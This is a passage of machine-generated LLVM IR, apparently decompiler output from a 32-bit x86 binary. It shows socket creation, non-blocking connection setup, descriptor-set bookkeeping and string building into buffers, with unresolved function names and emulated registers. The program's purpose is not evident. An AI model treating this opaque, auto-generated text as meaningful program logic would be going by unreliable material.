  %v0_804855f.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804855f

dec_label_pc_804855f:                             ; preds = %dec_label_pc_8048557.dec_label_pc_804855f_crit_edge, %dec_label_pc_8048c9d
  %v0_804855f = phi i32 [ %v0_804855f.pre, %dec_label_pc_8048557.dec_label_pc_804855f_crit_edge ], [ %v0_8048c9d, %dec_label_pc_8048c9d ]
  %v9_804855f = icmp eq i32 %v0_804855f, 12
  store i1 %v9_804855f, i1* %zf.global-to-local, align 1
  %v1_8048562 = add i32 %v0_80485a5, -1440
  %v2_8048562 = inttoptr i32 %v1_8048562 to i32*
  %v3_8048562 = load i32, i32* %v2_8048562, align 4
  store i32 %v3_8048562, i32* %edx.global-to-local, align 4
  store i8 0, i8* %v2_80485a5, align 1
  %v0_804856f = load i32, i32* %edx.global-to-local, align 4
  %v1_804856f = load i32, i32* @esp, align 4
  %v2_804856f = add i32 %v1_804856f, -4
  %v3_804856f = inttoptr i32 %v2_804856f to i32*
  store i32 %v0_804856f, i32* %v3_804856f, align 4
  %v1_8048570 = call i32 @function_804fb51(i32 %stack_var_-20924.0.ph)
  store i32 %v1_8048570, i32* %eax.global-to-local, align 4
  %v0_8048575 = load i32, i32* @esi, align 4
  %v1_8048575 = add i32 %v0_8048575, -1440
  %v2_8048575 = inttoptr i32 %v1_8048575 to i32*
  store i32 -1, i32* %v2_8048575, align 4
  %v0_804857f = load i32, i32* @esp, align 4
  %v6_804857f = icmp eq i32 %v0_804857f, -16
  store i1 %v6_804857f, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048582

dec_label_pc_8048582:                             ; preds = %dec_label_pc_8049829, %dec_label_pc_8049773, %dec_label_pc_80493a7, %dec_label_pc_8048cb2, %dec_label_pc_8048c28, %dec_label_pc_8048601, %dec_label_pc_804861f, %dec_label_pc_80486e4, %dec_label_pc_804855f
  %v0_8048582 = load i32, i32* @esp, align 4
  %v1_8048582 = add i32 %v0_8048582, 100
  %v2_8048582 = inttoptr i32 %v1_8048582 to i32*
  %v3_8048582 = load i32, i32* %v2_8048582, align 4
  %v0_8048586 = load i32, i32* @ebp, align 4
  %v1_8048586 = add i32 %v0_8048586, 3140
  store i32 %v1_8048586, i32* @ebp, align 4
  %v1_804858c = add i32 %v3_8048582, 1
  store i32 %v1_804858c, i32* %eax.global-to-local, align 4
  %v0_804858d = load i32, i32* @esi, align 4
  %v1_804858d = add i32 %v0_804858d, 3140
  store i32 %v1_804858d, i32* @esi, align 4
  store i32 %v1_804858c, i32* %v2_8048582, align 4
  %v0_8048597 = load i32, i32* @esp, align 4
  %v1_8048597 = add i32 %v0_8048597, 100
  %v2_8048597 = inttoptr i32 %v1_8048597 to i32*
  %v3_8048597 = load i32, i32* %v2_8048597, align 4
  store i32 %v3_8048597, i32* @ecx, align 4
  %v1_804859b = add i32 %v0_8048597, 112
  %v2_804859b = inttoptr i32 %v1_804859b to i32*
  %v3_804859b = load i32, i32* %v2_804859b, align 4
  %v15_804859b = icmp eq i32 %v3_804859b, %v3_8048597
  store i1 %v15_804859b, i1* %zf.global-to-local, align 1
  br i1 %v15_804859b, label %dec_label_pc_8048cdd, label %dec_label_pc_80485a5

dec_label_pc_80485a5:                             ; preds = %dec_label_pc_8048582, %dec_label_pc_8048517
  %v0_80485a5 = load i32, i32* @esi, align 4
  %v1_80485a5 = add i32 %v0_80485a5, -1436
  %v2_80485a5 = inttoptr i32 %v1_80485a5 to i8*
  %v3_80485a5 = load i8, i8* %v2_80485a5, align 1
  %v4_80485a5 = zext i8 %v3_80485a5 to i32
  %v5_80485a5 = load i32, i32* %eax.global-to-local, align 4
  %v6_80485a5 = and i32 %v5_80485a5, -256
  %v7_80485a5 = or i32 %v6_80485a5, %v4_80485a5
  store i32 %v7_80485a5, i32* %eax.global-to-local, align 4
  %v0_80485ab = load i32, i32* @ebp, align 4
  %v1_80485ab = add i32 %v0_80485ab, -16
  store i32 %v1_80485ab, i32* @edi, align 4
  %v6_80485ae = icmp eq i8 %v3_80485a5, 0
  %v10_80485ae = icmp eq i8 %v3_80485a5, 1
  store i1 %v10_80485ae, i1* %zf.global-to-local, align 1
  br i1 %v10_80485ae, label %dec_label_pc_80486ee, label %dec_label_pc_80485b6

dec_label_pc_80485b6:                             ; preds = %dec_label_pc_80485a5
  store i1 %v6_80485ae, i1* %zf.global-to-local, align 1
  %v1_80485b8 = icmp eq i1 %v6_80485ae, false
  br i1 %v1_80485b8, label %dec_label_pc_8048537, label %dec_label_pc_80485be

dec_label_pc_80485be:                             ; preds = %dec_label_pc_80485b6, %dec_label_pc_8048c91
  %v0_80485be = load i32, i32* @esp, align 4
  %v1_80485be = add i32 %v0_80485be, 20868
  %v2_80485be = inttoptr i32 %v1_80485be to i32*
  store i32 0, i32* %v2_80485be, align 4
  %v0_80485c9 = load i32, i32* @esp, align 4
  %v1_80485c9 = add i32 %v0_80485c9, 20872
  %v2_80485c9 = inttoptr i32 %v1_80485c9 to i32*
  store i32 0, i32* %v2_80485c9, align 4
  %v0_80485d4 = load i32, i32* @esp, align 4
  %v1_80485d4 = add i32 %v0_80485d4, 20876
  %v2_80485d4 = inttoptr i32 %v1_80485d4 to i32*
  store i32 0, i32* %v2_80485d4, align 4
  %v0_80485df = load i32, i32* @esp, align 4
  %v1_80485df = add i32 %v0_80485df, 20880
  %v2_80485df = inttoptr i32 %v1_80485df to i32*
  store i32 0, i32* %v2_80485df, align 4
  %v0_80485ea = load i32, i32* @esi, align 4
  %v1_80485ea = add i32 %v0_80485ea, -1440
  %v2_80485ea = inttoptr i32 %v1_80485ea to i32*
  %v3_80485ea = load i32, i32* %v2_80485ea, align 4
  store i32 %v3_80485ea, i32* %eax.global-to-local, align 4
  %v10_80485f0 = icmp eq i32 %v3_80485ea, -1
  store i1 %v10_80485f0, i1* %zf.global-to-local, align 1
  %v1_8048601.pre = load i32, i32* @esp, align 4
  br i1 %v10_80485f0, label %dec_label_pc_8048601, label %dec_label_pc_80485f5

dec_label_pc_80485f5:                             ; preds = %dec_label_pc_80485be
  %v9_80485f5 = icmp eq i32 %v1_8048601.pre, 12
  store i1 %v9_80485f5, i1* %zf.global-to-local, align 1
  %v2_80485f8 = add i32 %v1_8048601.pre, -16
  %v3_80485f8 = inttoptr i32 %v2_80485f8 to i32*
  store i32 %v3_80485ea, i32* %v3_80485f8, align 4
  %v1_80485f9 = call i32 @function_804fb51(i32 %stack_var_-20924.0.ph)
  store i32 %v1_80485f9, i32* %eax.global-to-local, align 4
  %v0_80485fe = load i32, i32* @esp, align 4
  %v1_80485fe = add i32 %v0_80485fe, 16
  %v6_80485fe = icmp eq i32 %v1_80485fe, 0
  store i1 %v6_80485fe, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048601

dec_label_pc_8048601:                             ; preds = %dec_label_pc_80485be, %dec_label_pc_80485f5
  %v1_8048601 = phi i32 [ %v1_80485fe, %dec_label_pc_80485f5 ], [ %v1_8048601.pre, %dec_label_pc_80485be ]
  %v0_8048601 = load i32, i32* @ecx, align 4
  %v2_8048601 = add i32 %v1_8048601, -4
  %v3_8048601 = inttoptr i32 %v2_8048601 to i32*
  store i32 %v0_8048601, i32* %v3_8048601, align 4
  %v1_8048602 = add i32 %v1_8048601, -8
  %v2_8048602 = inttoptr i32 %v1_8048602 to i32*
  store i32 0, i32* %v2_8048602, align 4
  %v1_8048604 = add i32 %v1_8048601, -12
  %v2_8048604 = inttoptr i32 %v1_8048604 to i32*
  store i32 1, i32* %v2_8048604, align 4
  %v1_8048606 = add i32 %v1_8048601, -16
  %v2_8048606 = inttoptr i32 %v1_8048606 to i32*
  store i32 2, i32* %v2_8048606, align 4
  %v3_8048608 = call i32 @function_8050345(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048608, i32* %eax.global-to-local, align 4
  %v1_8048610 = load i32, i32* @esi, align 4
  %v2_8048610 = add i32 %v1_8048610, -1440
  %v3_8048610 = inttoptr i32 %v2_8048610 to i32*
  store i32 %v3_8048608, i32* %v3_8048610, align 4
  %v10_8048616 = icmp eq i32 %v3_8048608, -1
  store i1 %v10_8048616, i1* %zf.global-to-local, align 1
  br i1 %v10_8048616, label %dec_label_pc_8048582, label %dec_label_pc_804861f

dec_label_pc_804861f:                             ; preds = %dec_label_pc_8048601
  %v0_804861f = load i32, i32* @edx, align 4
  %v1_804861f = load i32, i32* @esp, align 4
  %v2_804861f = add i32 %v1_804861f, -4
  %v3_804861f = inttoptr i32 %v2_804861f to i32*
  store i32 %v0_804861f, i32* %v3_804861f, align 4
  %v1_8048620 = add i32 %v1_804861f, -8
  %v2_8048620 = inttoptr i32 %v1_8048620 to i32*
  store i32 0, i32* %v2_8048620, align 4
  %v1_8048622 = add i32 %v1_804861f, -12
  %v2_8048622 = inttoptr i32 %v1_8048622 to i32*
  store i32 3, i32* %v2_8048622, align 4
  %v2_8048624 = add i32 %v1_804861f, -16
  %v3_8048624 = inttoptr i32 %v2_8048624 to i32*
  store i32 %v3_8048608, i32* %v3_8048624, align 4
  %v3_8048625 = call i32 @function_804fa8d(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804862a = load i32, i32* @esp, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  %v12_804862d = or i32 %v3_8048625, 2048
  store i32 %v12_804862d, i32* %eax.global-to-local, align 4
  %v2_8048630 = add i32 %v0_804862a, 8
  %v3_8048630 = inttoptr i32 %v2_8048630 to i32*
  store i32 %v12_804862d, i32* %v3_8048630, align 4
  %v1_8048631 = add i32 %v0_804862a, 4
  %v2_8048631 = inttoptr i32 %v1_8048631 to i32*
  store i32 4, i32* %v2_8048631, align 4
  %v0_8048633 = load i32, i32* @esi, align 4
  %v1_8048633 = add i32 %v0_8048633, -1440
  %v2_8048633 = inttoptr i32 %v1_8048633 to i32*
  %v3_8048633 = load i32, i32* %v2_8048633, align 4
  store i32 %v3_8048633, i32* %eax.global-to-local, align 4
  %v3_8048639 = inttoptr i32 %v0_804862a to i32*
  store i32 %v3_8048633, i32* %v3_8048639, align 4
  %v3_804863a = call i32 @function_804fa8d(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804863f = load i32, i32* @esp, align 4
  %v1_804863f = add i32 %v0_804863f, 20916
  store i32 %v1_804863f, i32* %eax.global-to-local, align 4
  %v2_8048646 = inttoptr i32 %v1_804863f to i32*
  store i32 65535, i32* %v2_8048646, align 4
  %v0_8048651 = load i32, i32* @esp, align 4
  %v1_8048651 = inttoptr i32 %v0_8048651 to i32*
  store i32 4, i32* %v1_8048651, align 4
  %v0_8048658 = load i32, i32* %eax.global-to-local, align 4
  %v1_8048658 = load i32, i32* @esp, align 4
  %v2_8048658 = add i32 %v1_8048658, -4
  %v3_8048658 = inttoptr i32 %v2_8048658 to i32*
  store i32 %v0_8048658, i32* %v3_8048658, align 4
  %v1_8048659 = add i32 %v1_8048658, -8
  %v2_8048659 = inttoptr i32 %v1_8048659 to i32*
  store i32 8, i32* %v2_8048659, align 4
  %v1_804865b = add i32 %v1_8048658, -12
  %v2_804865b = inttoptr i32 %v1_804865b to i32*
  store i32 0, i32* %v2_804865b, align 4
  %v0_804865d = load i32, i32* @esi, align 4
  %v1_804865d = add i32 %v0_804865d, -1440
  %v2_804865d = inttoptr i32 %v1_804865d to i32*
  %v3_804865d = load i32, i32* %v2_804865d, align 4
  store i32 %v3_804865d, i32* %eax.global-to-local, align 4
  %v2_8048663 = add i32 %v1_8048658, -16
  %v3_8048663 = inttoptr i32 %v2_8048663 to i32*
  store i32 %v3_804865d, i32* %v3_8048663, align 4
  %v5_8048664 = call i32 @function_805030a(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8048664, i32* %eax.global-to-local, align 4
  %v0_8048669 = load i32, i32* @esi, align 4
  %v1_8048669 = add i32 %v0_8048669, -1424
  %v2_8048669 = inttoptr i32 %v1_8048669 to i32*
  %v3_8048669 = load i32, i32* %v2_8048669, align 4
  store i32 %v3_8048669, i32* %eax.global-to-local, align 4
  %v0_804866f = load i32, i32* @esp, align 4
  %v1_804866f = add i32 %v0_804866f, 112
  %v2_804866f = inttoptr i32 %v1_804866f to i32*
  %v3_804866f = load i32, i32* %v2_804866f, align 4
  store i32 %v3_804866f, i32* %edx.global-to-local, align 4
  %v2_8048673 = add i32 %v0_804866f, 20904
  %v3_8048673 = inttoptr i32 %v2_8048673 to i32*
  store i32 %v3_8048669, i32* %v3_8048673, align 4
  %v0_804867a = load i32, i32* @esp, align 4
  %v1_804867a = add i32 %v0_804867a, 20900
  %v2_804867a = inttoptr i32 %v1_804867a to i16*
  store i16 2, i16* %v2_804867a, align 2
  %v0_8048684 = load i32, i32* @esp, align 4
  %v1_8048684 = add i32 %v0_8048684, 102
  %v2_8048684 = inttoptr i32 %v1_8048684 to i16*
  %v3_8048684 = load i16, i16* %v2_8048684, align 2
  %v5_8048684 = load i32, i32* %eax.global-to-local, align 4
  %v6_8048684 = and i32 %v5_8048684, -65536
  %v0_8048689 = load i32, i32* %edx.global-to-local, align 4
  %v1_8048689 = load i32, i32* @esi, align 4
  %v2_8048689 = add i32 %v1_8048689, -1432
  %v3_8048689 = inttoptr i32 %v2_8048689 to i32*
  store i32 %v0_8048689, i32* %v3_8048689, align 4
  %v2_804868f = call i16 @llvm.bswap.i16(i16 %v3_8048684)
  %v3_804868f = zext i16 %v2_804868f to i32
  %v6_804868f = or i32 %v3_804868f, %v6_8048684
  store i32 %v6_804868f, i32* %eax.global-to-local, align 4
  %v2_8048693 = load i32, i32* @esp, align 4
  %v3_8048693 = add i32 %v2_8048693, 20902
  %v4_8048693 = inttoptr i32 %v3_8048693 to i16*
  store i16 %v2_804868f, i16* %v4_8048693, align 2
  %v0_804869b = load i32, i32* @esp, align 4
  %v9_804869b = icmp eq i32 %v0_804869b, -28
  store i1 %v9_804869b, i1* %zf.global-to-local, align 1
  %v0_804869e = load i32, i32* @esi, align 4
  %v1_804869e = add i32 %v0_804869e, -1436
  %v2_804869e = inttoptr i32 %v1_804869e to i8*
  store i8 2, i8* %v2_804869e, align 1
  %v0_80486a5 = load i32, i32* @esp, align 4
  %v1_80486a5 = add i32 %v0_80486a5, -4
  %v2_80486a5 = inttoptr i32 %v1_80486a5 to i32*
  store i32 16, i32* %v2_80486a5, align 4
  %v1_80486a7 = add i32 %v0_80486a5, 20872
  store i32 %v1_80486a7, i32* %ecx.global-to-local, align 4
  %v2_80486ae = add i32 %v0_80486a5, -8
  %v3_80486ae = inttoptr i32 %v2_80486ae to i32*
  store i32 %v1_80486a7, i32* %v3_80486ae, align 4
  %v0_80486af = load i32, i32* @esi, align 4
  %v1_80486af = add i32 %v0_80486af, -1440
  %v2_80486af = inttoptr i32 %v1_80486af to i32*
  %v3_80486af = load i32, i32* %v2_80486af, align 4
  store i32 %v3_80486af, i32* @edi, align 4
  %v2_80486b5 = add i32 %v0_80486a5, -12
  %v3_80486b5 = inttoptr i32 %v2_80486b5 to i32*
  store i32 %v3_80486af, i32* %v3_80486b5, align 4
  %v4_80486b6 = call i32 @function_805016a(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80486b6, i32* %eax.global-to-local, align 4
  %v0_80486bb = load i32, i32* @esi, align 4
  %v1_80486bb = add i32 %v0_80486bb, -1440
  %v2_80486bb = inttoptr i32 %v1_80486bb to i32*
  %v3_80486bb = load i32, i32* %v2_80486bb, align 4
  %v1_80486c3 = urem i32 %v3_80486bb, 32
  store i32 %v1_80486c3, i32* %eax.global-to-local, align 4
  %v2_80486c6 = udiv i32 %v3_80486bb, 32
  store i32 %v2_80486c6, i32* %edx.global-to-local, align 4
  %v0_80486c9 = load i32, i32* @esp, align 4
  %v2_80486c9 = mul nuw nsw i32 %v2_80486c6, 4
  %v3_80486c9 = add nuw nsw i32 %v2_80486c9, 20628
  %v4_80486c9 = add i32 %v3_80486c9, %v0_80486c9
  %v5_80486c9 = inttoptr i32 %v4_80486c9 to i32*
  %v6_80486c9 = load i32, i32* %v5_80486c9, align 4
  %v9_80486c9 = shl i32 1, %v1_80486c3
  %v12_80486c9 = or i32 %v6_80486c9, %v9_80486c9
  store i32 %v12_80486c9, i32* %v5_80486c9, align 4
  %v0_80486d1 = load i32, i32* @esp, align 4
  %v1_80486d1 = add i32 %v0_80486d1, 16
  %v0_80486d4 = load i32, i32* @esi, align 4
  %v1_80486d4 = add i32 %v0_80486d4, -1440
  %v2_80486d4 = inttoptr i32 %v1_80486d4 to i32*
  %v3_80486d4 = load i32, i32* %v2_80486d4, align 4
  store i32 %v3_80486d4, i32* %eax.global-to-local, align 4
  %v1_80486da = add i32 %v0_80486d1, 88
  %v2_80486da = inttoptr i32 %v1_80486da to i32*
  %v3_80486da = load i32, i32* %v2_80486da, align 4
  %v5_80486da = sub i32 %v3_80486da, %v3_80486d4
  %v11_80486da = xor i32 %v3_80486da, %v3_80486d4
  %v12_80486da = xor i32 %v5_80486da, %v3_80486da
  %v13_80486da = and i32 %v12_80486da, %v11_80486da
  %v14_80486da = icmp slt i32 %v13_80486da, 0
  %v15_80486da = icmp eq i32 %v5_80486da, 0
  store i1 %v15_80486da, i1* %zf.global-to-local, align 1
  %v16_80486da = icmp slt i32 %v5_80486da, 0
  %v2_80486de = icmp eq i1 %v16_80486da, %v14_80486da
  br i1 %v2_80486de, label %dec_label_pc_8048582, label %dec_label_pc_80486e4

dec_label_pc_80486e4:                             ; preds = %dec_label_pc_8049829, %dec_label_pc_8049773, %dec_label_pc_80493a7, %dec_label_pc_8048cb2, %dec_label_pc_8048c28, %dec_label_pc_804861f
  %v1_80486e5 = phi i32 [ %v1_8049845, %dec_label_pc_8049829 ], [ %v1_804978f, %dec_label_pc_8049773 ], [ %v1_80493c3, %dec_label_pc_80493a7 ], [ %v0_8048cce, %dec_label_pc_8048cb2 ], [ %v1_8048c79, %dec_label_pc_8048c28 ], [ %v1_80486d1, %dec_label_pc_804861f ]
  %v0_80486e4 = phi i32 [ %v3_804983f, %dec_label_pc_8049829 ], [ %v3_8049789, %dec_label_pc_8049773 ], [ %v3_80493bd, %dec_label_pc_80493a7 ], [ %v3_8048cc8, %dec_label_pc_8048cb2 ], [ %v3_8048c7c, %dec_label_pc_8048c28 ], [ %v3_80486d4, %dec_label_pc_804861f ]
  %v1_80486e4 = add i32 %v0_80486e4, 1
  %v8_80486e4 = icmp eq i32 %v1_80486e4, 0
  store i1 %v8_80486e4, i1* %zf.global-to-local, align 1
  store i32 %v1_80486e4, i32* %eax.global-to-local, align 4
  %v2_80486e5 = add i32 %v1_80486e5, 72
  %v3_80486e5 = inttoptr i32 %v2_80486e5 to i32*
  store i32 %v1_80486e4, i32* %v3_80486e5, align 4
  br label %dec_label_pc_8048582

dec_label_pc_80486ee:                             ; preds = %dec_label_pc_80485a5
  %v1_80486ee = add i32 %v0_80485a5, 16
  %v2_80486ee = inttoptr i32 %v1_80486ee to i32*
  %v3_80486ee = load i32, i32* %v2_80486ee, align 4
  store i32 %v3_80486ee, i32* @ebx, align 4
  %v1_80486f1 = icmp eq i32 %v3_80486ee, 0
  store i1 %v1_80486f1, i1* %zf.global-to-local, align 1
  br i1 %v1_80486f1, label %dec_label_pc_8048c91, label %dec_label_pc_80486f9

dec_label_pc_80486f9:                             ; preds = %dec_label_pc_80486ee
  store i8 4, i8* %v2_80485a5, align 1
  %v0_8048700.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8048700

dec_label_pc_8048700:                             ; preds = %dec_label_pc_804853f, %dec_label_pc_80486f9
  %v0_8048700 = phi i32 [ %v0_80485a5, %dec_label_pc_804853f ], [ %v0_8048700.pre, %dec_label_pc_80486f9 ]
  %v1_8048700 = add i32 %v0_8048700, 24
  %v2_8048700 = inttoptr i32 %v1_8048700 to i32*
  store i32 -1, i32* %v2_8048700, align 4
  %v0_8048707 = load i32, i32* @esi, align 4
  %v1_8048707 = add i32 %v0_8048707, 12
  %v2_8048707 = inttoptr i32 %v1_8048707 to i32*
  store i32 0, i32* %v2_8048707, align 4
  %v0_804870e = load i32, i32* @edi, align 4
  %v1_804870e = add i32 %v0_804870e, 2116
  store i32 %v1_804870e, i32* @eax, align 4
  %v0_8048714 = load i32, i32* @ecx, align 4
  %v1_8048714 = load i32, i32* @esp, align 4
  %v2_8048714 = add i32 %v1_8048714, -4
  %v3_8048714 = inttoptr i32 %v2_8048714 to i32*
  store i32 %v0_8048714, i32* %v3_8048714, align 4
  %v0_8048715 = load i32, i32* @ecx, align 4
  %v2_8048715 = add i32 %v1_8048714, -8
  %v3_8048715 = inttoptr i32 %v2_8048715 to i32*
  store i32 %v0_8048715, i32* %v3_8048715, align 4
  %v1_8048716 = add i32 %v1_8048714, -12
  %v2_8048716 = inttoptr i32 %v1_8048716 to i32*
  store i32 1024, i32* %v2_8048716, align 4
  %v0_804871b = load i32, i32* @eax, align 4
  %v2_804871b = add i32 %v1_8048714, -16
  %v3_804871b = inttoptr i32 %v2_804871b to i32*
  store i32 %v0_804871b, i32* %v3_804871b, align 4
  %v2_804871c = call i32 @function_804f640(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_804871c, i32* %eax.global-to-local, align 4
  %v0_8048721 = load i32, i32* @esi, align 4
  %v1_8048721 = add i32 %v0_8048721, 672
  %v2_8048721 = inttoptr i32 %v1_8048721 to i32*
  store i32 0, i32* %v2_8048721, align 4
  %v0_804872b = load i32, i32* @esp, align 4
  %v1_804872b = inttoptr i32 %v0_804872b to i32*
  %v2_804872b = load i32, i32* %v1_804872b, align 4
  store i32 %v2_804872b, i32* %eax.global-to-local, align 4
  %v3_804872b = add i32 %v0_804872b, 4
  %v1_804872c = inttoptr i32 %v3_804872b to i32*
  %v2_804872c = load i32, i32* %v1_804872c, align 4
  store i32 %v2_804872c, i32* %edx.global-to-local, align 4
  store i32 10240, i32* %v1_804872c, align 4
  %v1_8048732 = add i32 %v0_804872b, 10388
  store i32 %v1_8048732, i32* @eax, align 4
  store i32 %v1_8048732, i32* %v1_804872b, align 4
  %v2_804873a = call i32 @function_804f640(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_804873a, i32* %eax.global-to-local, align 4
  %v0_804873f = load i32, i32* @edi, align 4
  %v1_804873f = add i32 %v0_804873f, 1431
  store i32 %v1_804873f, i32* %edx.global-to-local, align 4
  %v1_8048745 = load i32, i32* @esp, align 4
  %v2_8048745 = add i32 %v1_8048745, 112
  %v3_8048745 = inttoptr i32 %v2_8048745 to i32*
  store i32 %v1_804873f, i32* %v3_8048745, align 4
  %v0_8048749 = load i32, i32* @esp, align 4
  %v1_8048749 = inttoptr i32 %v0_8048749 to i32*
  %v2_8048749 = load i32, i32* %v1_8048749, align 4
  store i32 %v2_8048749, i32* %eax.global-to-local, align 4
  %v1_804874a = add i32 %v0_8048749, 10388
  store i32 %v1_804874a, i32* %ecx.global-to-local, align 4
  store i32 %v1_804874a, i32* %v1_8048749, align 4
  %v2_8048752 = call i32 @function_804f5b0(i8* %v1_8048752)
  store i32 %v2_8048752, i32* %eax.global-to-local, align 4
  %v0_8048757 = load i32, i32* @esp, align 4
  %v1_8048757 = inttoptr i32 %v0_8048757 to i32*
  %v2_8048757 = load i32, i32* %v1_8048757, align 4
  store i32 %v2_8048757, i32* %ecx.global-to-local, align 4
  %v3_8048757 = add i32 %v0_8048757, 4
  %v1_8048758 = inttoptr i32 %v3_8048757 to i32*
  %v2_8048758 = load i32, i32* %v1_8048758, align 4
  store i32 %v2_8048758, i32* @ebx, align 4
  %v1_8048759 = add i32 %v0_8048757, 112
  %v2_8048759 = inttoptr i32 %v1_8048759 to i32*
  %v3_8048759 = load i32, i32* %v2_8048759, align 4
  store i32 %v3_8048759, i32* %v1_8048758, align 4
  %v1_804875e = add i32 %v0_8048757, 10388
  store i32 %v1_804875e, i32* %edx.global-to-local, align 4
  %v2_8048765 = add i32 %v1_804875e, %v2_8048752
  store i32 %v2_8048765, i32* %eax.global-to-local, align 4
  store i32 %v2_8048765, i32* %v1_8048757, align 4
  %v3_8048769 = call i32 @function_804f5d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048769, i32* %eax.global-to-local, align 4
  %v0_804876e = load i32, i32* @esp, align 4
  %v1_804876e = inttoptr i32 %v0_804876e to i32*
  %v2_804876e = load i32, i32* %v1_804876e, align 4
  store i32 %v2_804876e, i32* @ebx, align 4
  %v1_804876f = add i32 %v0_804876e, 10388
  store i32 %v1_804876f, i32* %ecx.global-to-local, align 4
  store i32 %v1_804876f, i32* %v1_804876e, align 4
  %v2_8048777 = call i32 @function_804f5b0(i8* %v1_8048752)
  store i32 %v2_8048777, i32* %eax.global-to-local, align 4
  %v0_804877c = load i32, i32* @esp, align 4
  %v1_804877c = inttoptr i32 %v0_804877c to i32*
  %v2_804877c = load i32, i32* %v1_804877c, align 4
  store i32 %v2_804877c, i32* %edx.global-to-local, align 4
  %v3_804877c = add i32 %v0_804877c, 4
  %v1_804877d = inttoptr i32 %v3_804877c to i32*
  %v2_804877d = load i32, i32* %v1_804877d, align 4
  store i32 %v2_804877d, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805247f.7 to i32), i32* %v1_804877d, align 4
  %v1_8048783 = add i32 %v0_804877c, 10388
  store i32 %v1_8048783, i32* %edx.global-to-local, align 4
  %v2_804878a = add i32 %v1_8048783, %v2_8048777
  store i32 %v2_804878a, i32* %eax.global-to-local, align 4
  store i32 %v2_804878a, i32* %v1_804877c, align 4
  %v3_804878e = call i32 @function_804f5d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804878e, i32* %eax.global-to-local, align 4
  %v0_8048793 = load i32, i32* @esp, align 4
  %v1_8048793 = inttoptr i32 %v0_8048793 to i32*
  %v2_8048793 = load i32, i32* %v1_8048793, align 4
  store i32 %v2_8048793, i32* @ebx, align 4
  %v1_8048794 = add i32 %v0_8048793, 10388
  store i32 %v1_8048794, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048794, i32* %v1_8048793, align 4
  %v2_804879c = call i32 @function_804f5b0(i8* %v1_8048752)
  store i32 %v2_804879c, i32* %eax.global-to-local, align 4
  %v0_80487a1 = load i32, i32* @esp, align 4
  %v1_80487a1 = inttoptr i32 %v0_80487a1 to i32*
  %v3_80487a1 = add i32 %v0_80487a1, 4
  %v0_80487a2 = load i32, i32* @edi, align 4
  %v1_80487a2 = add i32 %v0_80487a2, 532
  store i32 %v1_80487a2, i32* %edx.global-to-local, align 4
  %v1_80487a8 = inttoptr i32 %v3_80487a1 to i32*
  %v2_80487a8 = load i32, i32* %v1_80487a8, align 4
  store i32 %v2_80487a8, i32* %ecx.global-to-local, align 4
  store i32 %v1_80487a2, i32* %v1_80487a8, align 4
  %v1_80487aa = add i32 %v0_80487a1, 10388
  store i32 %v1_80487aa, i32* %edx.global-to-local, align 4
  %v2_80487b1 = add i32 %v1_80487aa, %v2_804879c
  store i32 %v2_80487b1, i32* %eax.global-to-local, align 4
  store i32 %v2_80487b1, i32* %v1_80487a1, align 4
  %v3_80487b5 = call i32 @function_804f5d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80487b5, i32* %eax.global-to-local, align 4
  %v0_80487ba = load i32, i32* @esp, align 4
  %v1_80487ba = inttoptr i32 %v0_80487ba to i32*
  %v2_80487ba = load i32, i32* %v1_80487ba, align 4
  store i32 %v2_80487ba, i32* @ebx, align 4
  %v1_80487bb = add i32 %v0_80487ba, 10388
  store i32 %v1_80487bb, i32* %ecx.global-to-local, align 4
  store i32 %v1_80487bb, i32* %v1_80487ba, align 4
  %v2_80487c3 = call i32 @function_804f5b0(i8* %v1_8048752)
  store i32 %v2_80487c3, i32* %eax.global-to-local, align 4
  %v0_80487c8 = load i32, i32* @esp, align 4
  %v1_80487c8 = inttoptr i32 %v0_80487c8 to i32*
  %v2_80487c8 = load i32, i32* %v1_80487c8, align 4
  store i32 %v2_80487c8, i32* %edx.global-to-local, align 4
  %v3_80487c8 = add i32 %v0_80487c8, 4
  %v1_80487c9 = inttoptr i32 %v3_80487c8 to i32*
  %v2_80487c9 = load i32, i32* %v1_80487c9, align 4
  store i32 %v2_80487c9, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint ([24 x i8]* @global_var_805244f.8 to i32), i32* %v1_80487c9, align 4
  %v1_80487cf = add i32 %v0_80487c8, 10388
  store i32 %v1_80487cf, i32* %edx.global-to-local, align 4
  %v2_80487d6 = add i32 %v1_80487cf, %v2_80487c3
  store i32 %v2_80487d6, i32* %eax.global-to-local, align 4
  store i32 %v2_80487d6, i32* %v1_80487c8, align 4
  %v3_80487da = call i32 @function_804f5d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80487da, i32* %eax.global-to-local, align 4
  %v0_80487df = load i32, i32* @esp, align 4
  %v1_80487df = inttoptr i32 %v0_80487df to i32*
  %v2_80487df = load i32, i32* %v1_80487df, align 4
  store i32 %v2_80487df, i32* @ebx, align 4
  %v1_80487e0 = add i32 %v0_80487df, 10388
  store i32 %v1_80487e0, i32* %ecx.global-to-local, align 4
  store i32 %v1_80487e0, i32* %v1_80487df, align 4
